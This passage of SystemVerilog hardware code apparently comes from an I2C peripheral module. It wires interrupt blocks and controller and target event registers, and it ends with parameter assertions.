    .hw2reg_intr_state_d_o  (hw2reg.intr_state.stretch_timeout.d),
    .intr_o                 (intr_stretch_timeout_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_sda_unstable (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_sda_unstable),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.sda_unstable.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.sda_unstable.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.sda_unstable.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.sda_unstable.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.sda_unstable.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.sda_unstable.d),
    .intr_o                 (intr_sda_unstable_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_cmd_complete (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_cmd_complete),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.cmd_complete.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.cmd_complete.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.cmd_complete.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.cmd_complete.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.cmd_complete.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.cmd_complete.d),
    .intr_o                 (intr_cmd_complete_o)
  );

  prim_intr_hw #(
    .Width(1),
    .IntrT("Status")
  ) intr_hw_tx_stretch (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_tx_stretch),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.tx_stretch.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.tx_stretch.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.tx_stretch.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.tx_stretch.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.tx_stretch.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.tx_stretch.d),
    .intr_o                 (intr_tx_stretch_o)
  );

  prim_intr_hw #(
    .Width(1),
    .IntrT("Status")
  ) intr_hw_tx_threshold (
    .clk_i,
    .rst_ni,
    .event_intr_i           (tx_lt_threshold),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.tx_threshold.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.tx_threshold.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.tx_threshold.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.tx_threshold.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.tx_threshold.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.tx_threshold.d),
    .intr_o                 (intr_tx_threshold_o)
  );

  prim_intr_hw #(
    .Width(1),
    .IntrT("Status")
  ) intr_hw_acq_overflow (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_acq_stretch),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.acq_stretch.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.acq_stretch.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.acq_stretch.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.acq_stretch.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.acq_stretch.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.acq_stretch.d),
    .intr_o                 (intr_acq_stretch_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_unexp_stop (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_unexp_stop),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.unexp_stop.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.unexp_stop.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.unexp_stop.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.unexp_stop.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.unexp_stop.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.unexp_stop.d),
    .intr_o                 (intr_unexp_stop_o)
  );

  prim_intr_hw #(.Width(1)) intr_hw_host_timeout (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_host_timeout),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.host_timeout.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.host_timeout.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.host_timeout.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.host_timeout.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.host_timeout.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.host_timeout.d),
    .intr_o                 (intr_host_timeout_o)
  );

  assign hw2reg.controller_events.nack.d  = 1'b1;
  assign hw2reg.controller_events.nack.de = event_nak;
  assign hw2reg.controller_events.unhandled_nack_timeout.d  = 1'b1;
  assign hw2reg.controller_events.unhandled_nack_timeout.de = event_unhandled_nak_timeout;
  assign hw2reg.controller_events.bus_timeout.d  = 1'b1;
  assign hw2reg.controller_events.bus_timeout.de = event_bus_active_timeout && !host_idle;
  assign hw2reg.controller_events.arbitration_lost.d  = 1'b1;
  assign hw2reg.controller_events.arbitration_lost.de = event_controller_arbitration_lost;
  assign status_controller_halt = | {
    reg2hw.controller_events.nack.q,
    reg2hw.controller_events.unhandled_nack_timeout.q,
    reg2hw.controller_events.bus_timeout.q,
    reg2hw.controller_events.arbitration_lost.q
  };

  assign hw2reg.target_events.tx_pending.d  = 1'b1;
  assign hw2reg.target_events.tx_pending.de = event_read_cmd_received &&
                                              reg2hw.ctrl.tx_stretch_ctrl_en.q;
  assign hw2reg.target_events.bus_timeout.d  = 1'b1;
  assign hw2reg.target_events.bus_timeout.de = event_tx_bus_timeout;
  assign hw2reg.target_events.arbitration_lost.d  = 1'b1;
  assign hw2reg.target_events.arbitration_lost.de = event_tx_arbitration_lost;
  assign unhandled_tx_stretch_event = | {
    reg2hw.target_events.tx_pending.q,
    reg2hw.target_events.bus_timeout.q,
    reg2hw.target_events.arbitration_lost.q
  };

  ////////////////
  // ASSERTIONS //
  ////////////////
  // TODO: Decide whether to keep this assertion. It is primarily checking the
  // testbench, not the IP, due to the CDC cycle deletion.
  // Check to make sure scl_i is never a single cycle glitch
  //  `ASSERT(SclInputGlitch_A, $rose(scl_sync) |-> 1 scl_sync)

  `ASSERT_INIT(FifoDepthValid_A, FifoDepth > 0 && FifoDepthW <= MaxFifoDepthW)
  `ASSERT_INIT(AcqFifoDepthValid_A, AcqFifoDepth > 0 && AcqFifoDepthW <= MaxFifoDepthW)

endmodule